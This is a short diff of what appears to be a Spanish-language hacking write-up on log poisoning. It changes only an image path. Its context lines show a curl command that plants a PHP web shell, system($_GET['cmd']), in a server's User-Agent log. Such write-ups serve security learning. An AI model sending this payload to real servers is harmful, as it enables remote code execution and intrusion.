@@ -59,7 +59,7 @@ Se está interpretando el código PHP introducido en el valor de la cabecera Use
 curl -s X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 ~~~
 
-![](/assets/img/68.png)
+![](/assets/10/68.png)
 
 Ahora revisaremos nuestros logs nuevamente desde el navegador.
 
